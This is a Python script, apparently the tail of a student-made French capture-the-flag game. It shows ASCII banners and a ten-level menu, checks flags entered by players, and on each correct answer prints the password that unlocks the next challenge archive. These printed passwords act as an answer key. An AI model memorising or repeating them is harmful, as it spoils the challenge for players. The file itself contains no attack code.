⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠉⠀⠀⠀⠉⠻⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠀⢀⣴⠶⣄⠀⠀⠀⢀⣀⣸⣇⣀⣀⣀⣀⣀⣀⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠀⠸⣧⣀⣼⠃⠀⠀⢸⡏⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠀⠀⠈⠉⠁⠀⠀⠀⢸⡇⠀⠀⠀⠐⣿⠆⠀⠀⠀⠀⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠿⠄⠀⠀⠀⠀⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠙⣿⣿⣿⣿
⣿⣿⣿⣿⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣿⣿⣿⣿
"""



win_banner =Fore.WHITE+ """
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣶⣶⣿⣿⣷⣶⣶⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⡀⠀⠀⠀⠀
⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀
⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀
⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡏⠉⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠉⠉⣿⣿
⢻⣿⡇⠀⠀⠀⠈⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⢀⣿⡇
⠘⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢿⣿⣿⣿⠿⠛⠋⠀⠀⠀⠀⠀⠀⢀⣼⣿⠃
⠀⠹⣿⣿⣶⣦⣤⣀⣀⣀⣀⣀⣤⣶⠟⡿⣷⣦⣄⣀⣀⣀⣠⣤⣤⣶⣿⣿⡟⠀
⠀⠀⣨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⡇⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀
⠀⢈⣿⣿⣿⣿⣿⣿⡿⠿⠿⣿⣿⣷⠀⣼⣷⠀⣸⣿⣿⣿⡿⠿⠿⠿⠿⣿⣿⣿⡇⠀
⠀⠘⣿⣿⣿⡟⠋⠀⠀⠰⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⣿⣿⠟⠁⠀
⠀⠀⠈⠉⠀⠈⠁⠀⠀⠘⣿⣿⢿⣿⣿⢻⣿⡏⣻⣿⣿⠃⠀⠀⠀⠈⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⣿⣿⢸⣿⡇⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⣿⣿⢸⣿⡇⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⣿⣿⢸⣿⡇⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⣿⣿⢸⣿⠃⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡇⣿⣿⢸⣿⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠇⢿⡿⢸⡿⠀⠿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""







right_banner = Fore.WHITE + """
⠀⠀⠀⠀⠀⣶⡆⠀⠀⠀⢀⣴⢦⠀⠀⠀⠀⣖⡶⠀⠀⠀⠀⡏⡧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢹⣷⡀⠀⠀⢀⣿⣧⡀⠀⠀⢠⣾⣧⠀⠀⠀⣠⣾⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣦⡀⣼⣿⣿⣷⡀⢠⣿⣿⣿⡆⢀⣾⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠙⢿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠠⣤⣉⣙⠛⠛⠛⠿⠿⠁⣴⣦⡈⠻⠛⠛⠛⢛⣉⣁⡤⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠉⠛⠻⠿⠶⣶⣆⠈⢿⡿⠃⣠⣶⡿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⣿⣿⣶⣶⣤⣤⣤⣤⡀⢁⣠⣤⣤⣤⣶⣶⣿⣿⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣸⣿⡏⠉⠙⠛⠿⢿⣿⣿⣾⣿⡿⠿⠛⠋⠉⠹⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠻⢿⣧⣀⠀⠀⣀⣀⣼⡿⣿⣯⣀⣀⠀⠀⣀⣼⡿⠗⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⠁⠘⣿⣿⣿⣿⣿⠟⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣇⣀⣀⣹⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⠿⣿⡿⢿⣿⠿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡇⢀⣿⡇⢸⣿⡀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""




troll_banner =Fore.WHITE+ """
⠀⠀⠀⠀⠀⣀⡴⠖⠒⠒⢒⣒⡖⠒⠒⠒⠒⠒⠒⠶⠶⠤⣤⣀⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣴⠋⠀⠀⠤⣪⣝⡲⠯⠭⠥⠀⠀⠀⠀⠀⣀⣐⣒⡒⠉⠙⢦⡀⠀⠀
⠀⠀⠀⣼⠃⠀⠈⠰⠫⠋⣀⣀⣀⣀⠀⠃⠀⠀⠀⠸⠀⠀⠀⠈⠆⠀⠀⢧⠠⠀
⠀⣠⡾⠁⠀⡀⠠⠄⢰⣿⠿⠿⢯⣍⣙⣶⠀⠀⢀⣠⣶⣾⣿⠶⠆⠤⠤⢜⣷⡄
⡾⢻⢡⡞⠋⣽⠛⠲⠤⡤⠴⠋⠀⠀⠉⠁⠀⠀⠈⣿⠁⠀⢀⣀⣠⠶⠶⣽⣵⣿
⣇⢠⢸⡥⠶⣟⠛⠶⣤⣀⠀⠀⠀⢲⡖⣂⣀⠀⠀⠈⢳⣦⡀⠉⠉⣽⡄⠰⣻⣿
⠙⣮⡪⠁⠀⠻⣶⣄⣸⣍⠙⠓⠶⣤⣥⣉⣉⠀⠠⠴⠋⠁⣈⣥⣴⣿⡇⠈⣽⠃
⠀⠈⢻⡄⠀⠀⠙⣆⢹⡟⠷⣶⣤⣇⣀⠉⠙⡏⠉⣻⡟⢉⣹⣅⣼⣿⡇⠀⡏⠀
⠀⠀⠀⠻⣄⠀⠀⠈⠻⢦⡀⠀⣽⠉⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⡇⠀
⠀⠀⠀⠀⠙⢦⣀⠄⡀⢄⡙⠻⠧⣤⣀⣀⣿⠀⠀⣿⢀⣼⣃⣾⣼⠟⠁⠀⡇⠀
⠀⠀⠀⠀⠀⠀⠉⠓⢮⣅⡚⠵⣒⡤⢄⣉⠉⠉⠉⠉⠉⠉⠉⢀⡠⠀⠀⠀⣷⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠳⢦⣄⡉⠙⠛⠃⠀⠀⠀⠀⠉⠁⠀⠀⠀⠀⡿⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠲⠶⢤⣤⣀⣀⣀⣀⣀⣀⡤⠞⠁⠀
"""



wrong_banner =Fore.WHITE+ """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⠤⠤⠒⠒⠒⠒⠲⠦⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⡠⠐⠊⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢦⡀⠀⠀⠀⠀
⠀⢀⡶⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀⠀
⠀⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡄
⢸⠁⡤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻
⡏⢠⠁⠱⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸
⡇⡞⠀⠀⢣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠠⠤⢀⠀⠀⠀⠀⠀⢀⡠⠀⠘⢆⢻
⡗⡇⠀⠀⠈⢆⠀⠀⠀⠀⠀⠀⢀⣀⡠⠖⠒⠒⠢⣄⠁⠀⢀⢀⣠⠞⠉⠑⠢⣜⠀
⢠⠃⠀⠀⠀⠈⣆⠀⠀⠀⠀⢠⣿⡏⠀⠀⠀⢀⣀⠈⠆⠐⠁⠈⡏⠀⠀⢀⣤⡜⡆
⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⣿⣿⡆⠀⠀⠀⣛⣿⡇⣤⠀⠀⠀⠑⡀⠀⠘⣘⣃⠃
⠀⢇⠀⠀⡀⠀⠀⠀⠀⠀⠀⠸⣇⠙⢦⣀⠀⠈⣉⡴⠃⠀⢀⡴⡆⠳⡤⠤⠆⡇⠀
⠀⠈⣏⠈⠉⢦⡀⠀⠀⠀⠀⠀⠙⠒⠈⠉⠛⡛⣫⠆⠀⢠⣾⣷⣷⠀⠀⠢⢠⠇⠀
⠀⠀⠘⣧⣄⠀⣩⠢⣄⠀⠀⠀⠠⠤⠴⠚⠉⠺⠃⠀⢀⡟⣿⠙⢿⢀⣄⣤⡞⠀⠀
⠀⠀⠀⠀⠙⢳⣬⠀⢼⣷⡀⢄⣤⣤⣴⣦⠴⠁⠀⠐⡜⣆⠸⣆⣘⢸⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠟⠀⠀⠙⣯⠉⠉⢒⣯⣿⠀⠀⠀⠀⠀⠈⠉⠙⠛⠈⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⡀⢀⣀⣈⣇⣴⣿⢏⣼⣦⡈⠑⠲⠤⣤⣀⣀⡠⠺⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢧⠀⠀⠉⠉⢻⣵⣿⣿⣿⣿⢷⢠⣤⣀⣈⣀⠈⠜⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⢣⡀⢀⡀⠀⠙⢿⣿⣿⢏⠎⣼⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣆⠙⠢⣕⣤⠙⠓⢋⡜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠶⢦⠭⣽⡶⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"""













menu_banner = Fore.WHITE+"""
                            ,--.
                           {    }   """ + Fore.WHITE + Style.BRIGHT + "                                        Menu des épreuves :" """
                           K,   |
                          /  ~Y`
                     ,   /   /                                               
                    {_'-K.__/
                      `/-.__L._         """ + Fore.BLUE + "                     [1]" + Fore.RED + "                     [2]" + Fore.GREEN + "                     [3]" + Fore.WHITE +   """ 
                      /  ' /`|_|        
                     /  ' /
             ____   /  ' /              
      ,-'~~~~    ~~/  ' /_
    ,'             ``~~~  ',
   (                        Y           """ + Fore.YELLOW + "                     [4]" + Fore.MAGENTA + "                     [5]" + Fore.CYAN + "                     [6]" + Fore.WHITE + """
  {                         I
 {      -                    `,
 |       ',                   )
 |        |   ,..__      __. Y
 |    .,_./  Y ' / ^Y   J   )|
 |           |' /   |   |   ||          """ + Fore.LIGHTRED_EX + "                     [7]" + Fore.LIGHTWHITE_EX + "                     [8]" + Fore.LIGHTYELLOW_EX + "                     [9]" + Fore.WHITE + """
  |          L_/    . _ (_,.'(
   |,   ,      ^^""' / |      |
     |_             /,L]     /
       '-_~-,       ` `   ./`                                                       
          `'{_            )
              ^^..___,.--`                                       """ +  Fore.BLUE + "[10]" + Fore.WHITE + "                             exit" """
"""










start_banner = Fore.RED + """\
⢀⡤⢤⢄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣼⡅⠠⢀⡈⢀⣙⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠤⠤⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀                 
⠀⠀⠀⢸⠀⠀⠀⠈⠙⠿⣝⢇⠀⠀⣀⣠⠤⠤⠤⠤⣤⡤⠚⠁⠀⠀⠀⠀⠀⠉⠢⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢧⡀⠀⠀⠠⣄⠈⢺⣺⡍⠀⠀⠀⠀⣠⠖⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⠀                                      
⠀⠀⠀⠀⠸⡆⢀⠘⣔⠄⠑⠂⠈⠀⡔⠤⠴⠚⡁⠀⠀⢀⠀⠀⠀⣠⠔⢶⡢⡀⠀⠠⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⣇⠀⢃⡀⠁⠀⠀⠀⡸⠃⢀⡴⠊⢀⠀⠀⠈⢂⡤⠚⠁⠀⠀⠙⢿⠀⠉⡇⠀⠀⠀⠀⠀             
⠀⠀⠀⣠⠾⣹⢤⢼⡆⠀⠀⠀⠀⠀⠀⠈⢀⠞⠁⠀⢠⣴⠏⠀⠀⠀⠀⠀⠀⠸⡇⠀⢇⠀⠀⠀⠀⠀               
⠀⠀⣾⢡⣤⡈⠣⡀⠙⠒⠀⠀⠀⠀⣀⠤⠤⣤⠤⣌⠁⢛⡄⠀⠀⠀⠀⠀⠠⡀⢇⠀⠘⣆⠀⢀⡴⡆     ██████╗               ████████╗                 ███████╗                   
⠀⠀⣿⢻⣿⣿⣄⡸⠀⡆⠀⠒⣈⣩⣉⣉⡈⠉⠉⠢⣉⠉⠀⠀⠀⠀⠀⠀⠀⢣⠈⠢⣀⠈⠉⢁⡴⠃   ██|╔════╝              ╚══██╔══╝                  ██╔════╝  
⠀⢀⢿⣿⣿⡿⠛⠁⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⣸⢿⠀⠀⠀⠀⠀⠀⠀⠸⡄⠀⡇⠉⠉⠁⠀⠀  ██║      APTURE           ██║ HE                  █████╗ LAG
⣠⣞⠘⢛⡛⢻⣷⣤⡀⠈⡎⣿⣿⣿⣿⣿⣿⣿⣿⣿⠹⠏⠀⠀⠀⠀⠀⠀⠀⠀⠇⢰⡇⠀⠀⠀⠀⠀    ██║      APTURE           ██║ HE                  ██╔══╝ LAG
⠻⣌⠯⡁⢠⣸⣿⣿⣷⡄⠁⠈⢻⢿⣿⣿⣿⣿⣿⠿⠋⠃⠰⣀⠀⠀⠀⠀⠀⠀⠀⣾⠇⠀⠀⠀⠀⠀    ╚██████╗                  ██║                     ██║
⠀⠀⠉⢻⠨⠟⠹⢿⣿⢣⠀⠀⢨⡧⣌⠉⠁⣀⠴⠊⠑⠀⡸⠛⠀⠀⠀⠀⠀⣸⢲⡟⠀⠀⠀⠀⠀⠀      ╚═════╝                  ╚═╝                     ╚═╝
⠀⠀⣠⠏⠀⠀⠀⠉⠉⠁⠀⠐⠁⠀⠀⢉⣉⠁⠀⠀⢀⠔⢷⣄⠀⠀⠀⠀⢠⣻⡞⠀⠀⠀⠀⠀⠀⠀
⠀⢠⠟⡦⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⢾⠉⠀⣹⣦⠤⣿⣿⡟⠁⠀⠀⠀⢀⣶⠟⠀⠀⠀⠀⠀⠀⠀⠀                                                                                                          
⠀⠈⠙⣦⣁⡎⢈⠏⢱⠚⢲⠔⢲⠲⡖⠖⣦⣿⡟⠀⣿⡿⠁⣠⢔⡤⠷⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢿⣟⠿⡿⠿⠶⢾⠶⠾⠶⠾⠞⢻⠋⠏⣸⠁⠀⡽⠓⠚⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⡏⠳⠷⠴⠣⠜⠢⠜⠓⠛⠊⠀⢀⡴⠣⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                       by Ethan BLANCHARD 107
⠀⠀⣏⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠊⠁⢀⣀⣀⠴⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⢦⡀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠴⠖⠒⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠉⠑⠒⠒⠐⠒⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""


clear()
print(start_banner)
start0 = input("Commencer ? (y)  ")
if start0 == "y" or "Y":
    clear()
    print("Bienvenu dans le CTF créé par Ethan BLANCHARD 107")
    print(Fore.RED + "LISEZ BIEN ATTENTIVEMENT LES REGLES")
    print(Fore.LIGHTWHITE_EX + "Vous devrez utiliser vos talents en informatique et surtout en Sécurité informatique pour arriver au bout du jeu.")
    print("                                                                                                                            ")
    print("Il y'a" + Fore.GREEN + " 10" + Fore.LIGHTWHITE_EX + " épreuves.")
    print("                                                                                                                            ")
    print("Chaque épreuve vous donnera un flag qu'il faudra rentrer dans le terminal afin de débloquer le prochain niveau.")
    print("Toutes les épreuves se trouvent dans le dossier 'Épreuves', sous forme d'archives cryptées.")
    print("Pour dévérouiller l'archive, il vous faudra fournir le flag de l'épreuve précédente")
    print("Le fichier contiendra une documentation qui vous aidera à terminer le niveau.")
    print("Ce jeu se joue sur une machine linux équipée d'outils de pentest (Je conseille un Kali).") 
    print("Sinon il faudra installer vous même les outils nécéssaires.")
    print("Afin de garentir une expérience de jeu optimale,")
    print("je vous recommande de ne pas analyser le code du programme pour trouver les réponses au prochains niveaux.")
    print("                                                                                                                            ")
    print("Vous serez invités à rentrer le numéro du niveau correspondant avant de fournir le flag,")
    print("cela garentira une sauvegarde en cas de fermeture du programme.")

    i1 = 0
    while i1 == 0:
        start = input( Fore.RED + "Commencer ? (y or n):     ")
        if start == "y":
                clear()
                print(start_banner1)
                
                input(Fore.WHITE + "Entrée pour continuer ")
                clear()
                i1 = 1
                i = 0
                while i == 0:
                    print(menu_banner)
                    print("Entrez le numéro de l'épreuve (1 à 10), ""start"" (commencer le jeu) ou ""exit"" (quiter):")               
                    num = input()
                    if num == "1":
                        clear()
                        print(banner_1)
                        pass1 = input("Rentrez le flag: ")
                        if pass1 == Flag_base["F1"]:
                            clear()
                            print(right_banner)
                            print( Fore.GREEN +"Bonne réponse")
                            print(Fore.YELLOW +"PASS01"  + Fore.WHITE)
                            awns = input("Retourner au menu des épreuves ? (entrée) :  ")
                            if awns == "":
                                clear()
                            elif awns != "":
                                clear()
                        
                        else:
                            clear()
                            print(wrong_banner)
                            print(Fore.RED + "Mauvaise réponse.")
                            awns = input("Retourner au menu des épreuves ? (entrée) :  ")
                            if awns == "":
                                clear()
                            elif awns != "":
                                clear()

                            
                    
                    elif num == "2":
                        clear()
                        print(banner_2)
                        pass2 = input("Rentrez le flag: ")
                        if pass2 == Flag_base["F2"]:
                            clear()
                            print(right_banner)
                            print( Fore.GREEN +"Bonne réponse")
                            print(Fore.YELLOW +"LOYOLA"  + Fore.WHITE)
                            awns = input("Retourner au menu des épreuves ? entrée) :  ")
                            if awns == "":
                                clear()
                            elif awns != "":
                                clear()

                        else:
                            clear()
                            print(wrong_banner)
                            print(Fore.RED + "Mauvaise réponse.")
                            awns = input("Retourner au menu des épreuves ? (entrée) :  ")
                            if awns == "":
                                clear()
                            elif awns != "":
                                clear()
                    
                    elif num == "3":
                        clear()
                        print(banner_3)
                        pass3 = input("Rentrez le flag: ")
                        if pass3 == Flag_base["F3"]:
                            clear()
                            print(right_banner)
                            print( Fore.GREEN +"Bonne réponse")
                            print(Fore.YELLOW +"Rami MALEK"  + Fore.WHITE)
                            awns = input("Retourner au menu des épreuves ? (entrée) :  ")
                            if awns == "":
                                clear()
                            elif awns != "":
                                clear()

                        else:
                            clear()
                            print(wrong_banner)
                            print(Fore.RED + "Mauvaise réponse.")
                            awns = input("Retourner au menu des épreuves ? (entrée) :  ")
                            if awns == "":
                                clear()
                            elif awns != "":
                                clear()

                    elif num == "4":
                        clear()
                        print(banner_4)
                        pass4 = input("Rentrez le flag: ")
                        if pass4 == Flag_base["F4"]:
                            clear()
                            print(right_banner)
                            print( Fore.GREEN +"Bonne réponse")
                            print(Fore.YELLOW +"linkinpark"  + Fore.WHITE)
                            awns = input("Retourner au menu des épreuves ? (entrée) :  ")
                            if awns == "":
                                clear()
                            elif awns != "":
                                clear()

                        else:
                            clear()
                            print(wrong_banner)
                            print(Fore.RED + "Mauvaise réponse.")
                            awns = input("Retourner au menu des épreuves ? (entrée) :  ")
                            if awns == "":
                                clear()
                            elif awns != "":
                                clear()

                    elif num == "5":
                        clear()
                        print(banner_5)
                        pass5 = input("Rentrez le flag: ")
                        if pass5 == Flag_base["F5"]:
                            clear()
                            print(right_banner)
                            print( Fore.GREEN +"Bonne réponse")
                            print(Fore.YELLOW +"Domino Park"  + Fore.WHITE)
                            awns = input("Retourner au menu des épreuves ? (entrée) :  ")
                            if awns == "":
                                clear()
                            elif awns != "":
                                clear()

                        else:
                            clear()
                            print(wrong_banner)
                            print(Fore.RED + "Mauvaise réponse.")
                            awns = input("Retourner au menu des épreuves ? (entrée) :  ")
                            if awns == "":
                                clear()
                            elif awns != "":
                                clear()

                    elif num == "6":
                        clear()
                        print(banner_6)
                        pass6 = input("Rentrez le flag: ")
                        if pass6 == Flag_base["F6"]:
                            clear()
                            print(right_banner)
                            print( Fore.GREEN +"Bonne réponse")
                            print(Fore.YELLOW +"https://lesjouxjouxdewilly.us"  + Fore.WHITE)
                            awns = input("Retourner au menu des épreuves ? (entrée) :  ")
                            if awns == "":
                                clear()
                            elif awns != "":
                                clear()

                        else:
                            clear()
                            print(wrong_banner)
                            print(Fore.RED + "Mauvaise réponse.")
                            awns = input("Retourner au menu des épreuves ? (entrée) :  ")
                            if awns == "":
                                clear()
                            elif awns != "":
                                clear()

                    elif num == "7":
                        clear()
                        print(banner_7)
                        pass7 = input("Rentrez le flag: ")
                        if pass7 == Flag_base["F7"]:
                            clear()
                            print(right_banner)
                            print( Fore.GREEN +"Bonne réponse")
                            print(Fore.YELLOW +"AlGo269$"  + Fore.WHITE)
                            awns = input("Retourner au menu des épreuves ? (entrée) :  ")
                            if awns == "":
                                clear()
                            elif awns != "":
                                clear()

                        else:
                            clear()
                            print(wrong_banner)
                            print(Fore.RED + "Mauvaise réponse.")
                            awns = input("Retourner au menu des épreuves ? (entrée) :  ")
                            if awns == "":
                                clear()
                            elif awns != "":
                                clear()


                    elif num == "8":
                        clear()
                        print(banner_8)
                        pass8 = input("Rentrez le flag: ")
                        if pass8 == Flag_base["F8"]:
                            clear()
                            print(right_banner)
                            print( Fore.GREEN +"Bonne réponse")
                            print(Fore.YELLOW +"28111977@rgh"  + Fore.WHITE)
                            awns = input("Retourner au menu des épreuves ? (entrée) :  ")
                            if awns == "":
                                clear()
                            elif awns != "":
                                clear()
                        else:
                            clear()
                            print(wrong_banner)
                            print(Fore.RED + "Mauvaise réponse.")
                            awns = input("Retourner au menu des épreuves ? (entrée) :  ")
                            if awns == "":
                                clear()
                            elif awns != "":
                                clear()

                    elif num == "9":
                        clear()
                        print(banner_9)
                        pass9 = input("Rentrez le flag: ")
                        if pass9 == Flag_base["F9"]:
                            clear()
                            print(right_banner)
                            print( Fore.GREEN +"Bonne réponse")
                            print(Fore.YELLOW +"FSOCIETY01"  + Fore.WHITE)
                            awns = input("Retourner au menu des épreuves ? (entrée) :  ")
                            if awns == "":
                                clear()
                            elif awns != "":
                                clear()

                        else:
                            clear()
                            print(wrong_banner)
                            print(Fore.RED + "Mauvaise réponse.")
                            awns = input("Retourner au menu des épreuves ? (entrée) :  ")
                            if awns == "":
                                clear()
                            elif awns != "":
                                clear()

                    elif num == "10":
                        clear()
                        print(vault_banner)
                        code = input("Rentrez le code secret: ")
                        if code == Flag_base["F10"]:
                            clear()
                            print(win_banner)
                            print("Vous avez gagné !!")
                            print("Envoyez moi" + Fore.GREEN + " CTF2025" + Fore.WHITE + " , suivit du code secret de l'épreuve 10 par mail :")
                            print(Fore.GREEN + "ethan.blanchard@monlycee.net")
                            awns = input("Retourner au menu des épreuves ? (y) :  ")
                            if awns == "y":
                                clear()
                           

                        else:
                            clear()
                            print(wrong_banner)
                            print(Fore.RED + "Mauvaise réponse.")
                            awns = input("Retourner au menu des épreuves ? (entrée) :  ")
                            if awns == "":
                                clear()
                            elif awns != "":
                                clear()
                        

                    elif num == "exit":
                        exit()
                        clear()
        
                    else:
                        clear()
                        print(troll_banner)
                        print("L'épreuve spécifiée n'existe pas.")
                        awns = input(Fore.WHITE + "Retourner au menu des épreuves ? (entrée) :  ")
                        if awns == "":
                                clear()
                        elif awns != "":
                                clear()
        
        
        elif start == "n":
            exit()
        else:
            print("Veuillez spécifier une réponse valide ""y"" (commencer) ou ""n"" (quiter)")
            
            
            
            
            
 #Auteur : Ethan BLANCHARD 107
